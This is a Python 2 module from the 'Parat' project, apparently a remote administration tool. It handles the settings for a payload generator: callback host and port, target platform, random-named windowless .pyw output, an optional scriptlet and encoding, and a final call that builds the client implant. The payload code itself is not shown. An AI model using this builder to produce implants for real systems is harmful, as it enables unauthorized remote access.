#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import os
import shutil
import ConfigParser
from string import ascii_uppercase, ascii_lowercase, digits
from random import choice
from lib.ParatPrint import colorize, pprint, gray
from core.ParatError import Generate
from lib.Helper import GenHelp
from client.py import create_it
from conf import config_file



class ParatGenerate:

    def __init__(self):

        self.root_path         = os.path.abspath(os.path.join(os.path.dirname(__file__)))
        self.config            = config_file()
        self.conf_path         = config_file('get_path')
        self.wash              = lambda inp: inp.lower().strip()

        self.current_arch      = self.wash(self.config.get('base', 'current_arch'))
        self.current_platform  = self.wash(self.config.get('base', 'current_platform'))
        self.host              = self.wash(self.config.get('base', 'local_host'))
        self.port              = self.wash(self.config.get('base', 'local_port'))
        self.log               = self.wash(self.config.get('base', 'logs'))

        status  = self.wash(self.config.get('cmd', 'colors'))
        self.colors = True if status == "on" else False

        self.perfix            = "Parat-"
        self.random_output     = True
        self.platforms         = [a for a in self.wash(self.config.get('gen', 'os')).split(", ")]
        self.architectures     = [a for a in self.wash(self.config.get('gen', 'arch')).split(", ")]
        self.random_string     = ''.join(choice(ascii_uppercase + ascii_lowercase + digits) for _ in range(6))
        self.output            = self.perfix + self.current_arch + "_" + self.random_string + ".pyw"
        self.scriptlet         = [None, ""] # name, content (read binary)
        self.encoding          = False
        self.path              = None




    def get_plats(self):
        return self.platforms


    def get_archs(self):
        return self.architectures


    def set_arch(self, arch):

        try:

            self.current_arch = arch
            self.config.set('base', 'current_arch', arch)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True

        except:
            return False




    def set_plat(self, platform):

        try:

            self.current_platform = platform
            self.config.set('base', 'current_platform', platform)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True

        except:
            return False



    def set_host(self, host):

        try:

            self.host = host
            self.config.set('base', 'local_host', host)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True

        except:
            return False



    def set_port(self, port):

        try:
            self.port = port
            self.config.set('base', 'local_port', port)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True

        except:
            return False



    def set_output(self, name):

        try:

            file_type = name.split('.')[-1:]
            file_name = '.'.join(name.split('.')[:-1])

            if file_type not in ['py', 'pyw']:
                file_name = name

            if file_type and not file_name:
                file_name = "".join(file_type)
                file_type = "py"

            if file_type != "pyw":
                name = '.'.join([file_name, "pyw"])
            self.output = name

            self.config.set('gen', 'output', name)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()

            self.random_output = False
            return True

        except:
            return False



    def set_scriptlet(self, scriptlet):

        if os.path.isfile(scriptlet):

            self.scriptlet[0] = scriptlet
            self.scriptlet[1] = open(scriptlet, "r").read()

            self.config.set('gen', 'scriptlet', scriptlet)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True

        else:
            pprint(
                colorize(
                    "Script not found: %s\n" % scriptlet,
                    colored=self.colors,
                    status="ERR"
                ), 1)
            return False



    def set_encoding(self, status):

        try:

            self.encoding = status
            context = "on" if status else "off"
            self.config.set('base', 'encode', context)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True

        except:
            return False


    def set_path(self, path):

        try:
            check = os.path.join(path, '.parat_tmp')
            open(check, 'w')

        except Exception as error:

            if error.errno == 2:
                pprint(
                    colorize(
                        "No such file or directory: '%s'\n" % path,
                        colored=self.colors,
                        status="ERR"
                    ), 1)
            elif error.errno == 13:
                pprint(
                    colorize(
                        "Permission denied: '%s'\n" % path,
                        colored=self.colors,
                        status="ERR"
                    ), 1)
            else:
                pprint(
                    colorize(
                        str(error)+'\n',
                        colored=self.colors,
                        status="ERR"
                    ), 1)
            return False

        else:

            self.path = path
            self.config.set('gen', 'path', path)
            with open(self.conf_path, 'wb') as confile:
                self.config.write(confile)
            confile.close()
            return True



    def help(self):

        status = self.wash(self.config.get('cmd', 'colors'))
        self.colors = True if status == "on" else False

        cpath = self.wash(self.config.get('gen', 'path'))
        self.path = None if cpath.strip() == "" else cpath.strip()

        help_banner = GenHelp.genhelp(self="") if \
            self.colors else gray(GenHelp.genhelp(self=""))

        if self.random_output:
            pprint(help_banner.format(self.current_platform,
                self.current_arch, self.host, self.port, self.scriptlet[0], self.path))
        else:
            pprint(help_banner.format(self.current_platform, self.current_arch,
                self.host, self.port, self.output, self.scriptlet[0], self.path))



    def show(self):

        status = self.wash(self.config.get('cmd', 'colors'))
        self.colors = True if status == "on" else False

        cpath = self.wash(self.config.get('gen', 'path'))
        self.path = None if cpath.strip() == "" else cpath.strip()

        current_settings = GenHelp.genshow(self="") if \
            self.colors else gray(GenHelp.genshow(self=""))

        pprint(current_settings.format(self.current_platform,
            self.current_arch, self.host, self.port, self.output, self.scriptlet[0], self.path))
        pprint("\n")



    def finally_generate(self):

        if self.path == None: self.path = os.path.abspath('')

        result = create_it(self.output, self.host, self.port, self.current_platform,
            self.current_arch, self.path, self.scriptlet[1], self.encoding)

        if not result:
            pprint(
                    colorize(
                        ">>Saved     : ", colored=self.colors, color="GREEN"
                ) + str(self.path + "/parat_output/" + self.output
            ) + "\n")
        else:
            pprint(
                colorize(
                    result + "\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)
